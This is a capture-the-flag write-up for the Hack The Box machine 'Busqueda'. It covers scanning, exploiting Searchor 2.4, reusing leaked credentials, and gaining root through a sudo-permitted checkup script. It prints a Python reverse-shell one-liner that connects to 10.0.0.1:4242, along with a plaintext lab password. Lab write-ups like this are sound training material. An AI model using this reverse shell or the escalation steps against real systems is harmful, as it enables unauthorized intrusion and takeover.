# Busqueda
#### Busqueda Hack The box 
Hello Hackers, I'm [0xDigimon](https://www.linkedin.com/in/abdelmawla-elamrosy/)
I started nmap scanner (i didn't use any arg to make scan faster) <br> ``` namp -Pn 10.10.11.208 ```<br> 
output.<br>
<img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/01.png?raw=true"><br>
now discover website <br> <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/02.png?raw=true"><br>
i started burp to intercept the request<br> <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/03.png?raw=true"><br>
Fuzzing website using dirsearch <br> ```dirsearch -u "http://searcher.htb/" ``` <br> <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/04.png?raw=true"><br>
also i tryed searching about <strong>sqli</strong> in input lables <br> ```sqlmap -r req.txt -p <pram,pram> --dbs```<br>  <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/05.png?raw=true"><br>
but I didn't got anything ):<br>
wait... what is this in the bottom i smell vulnerability here<br> <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/06.png?raw=true"><br>
i search on ```searchor 2.4 exploit``` and i found POC for this vulnerability <br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/07.png?raw=true"><br>
now i gained access on this machine <br> <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/08.png?raw=true"><br>
<strong>BOOOOOM</strong> i got user flag <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/09.png?raw=true"><br>
now i want to escalate my privillege <br>
discover all files in ```/var/www``` i found .git file ```git log``` <br>i got some info as <strong>administrator</strong> and new subdomain <strong>gitea.searcher.htb</strong><br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/10.png?raw=true"><br> 
```git config -l ``` <br>i got credential to login <br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/11.png?raw=true"><br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/12.png?raw=true"><br>
i didn't got on any important info. so i try connect using ssh on cody and svc and administrator i gained access again from svc user but now i have password.<br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/13.png?raw=true"><br>so i did some enumerations to do privilege escalation like ```sudo -l ``` i got on script called ```system-checkup.py```and after run it i found some important command and by using this script i found two containners <br> <img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/14.png?raw=true"><br>
after some search about docker-inspector i got some important command in this [website](https://docs.docker.com/config/formatting/)<br>
and used Hint section to show all content in these containers as a json file ```--format='{{json .}}'``` after this i used [json pretty print](https://jsonformatter.org/json-pretty-print) <br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/15.png?raw=true"><br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/16.png?raw=true"><br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/17.png?raw=true"><br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/18.png?raw=true"><br>do you notice any thing!, yes i got passwords in database <br>
so i trying to gain access on database using mysql<br>```mysql -h gitea.searcher.htb -u root -p```<br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/19.png?raw=true"><br>
but i failed ): so i went to website and tried usernames and passwords.<br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/20.png?raw=true"><br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/21.png?raw=true"><br>
and i used administrator and yuiu1hoiu4i5ho1uh <br>
now i have access to show codes <br>
in system-checkup.py script i fount that i can run full-checkup script if we are in the same directory,<br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/22.png?raw=true"><br> so i create bash reverse shell but it not working so i tried to create python reverse shell in bash file using [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)<br>```import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")```<br>
and make it executable file ```chmod +x full-checkup.sh```and start listener and run ```system-checkup.py full-checkup``` <br><strong>BOOOOOOOM (: </strong> i have a <strong>root</strong> shell <br><img src="https://github.com/0xDigimon/CyLert-Internship/blob/main/HTB-Machines/Busqueda/media/23.png?raw=true"><br>
<hr>

#### thanks for reading 
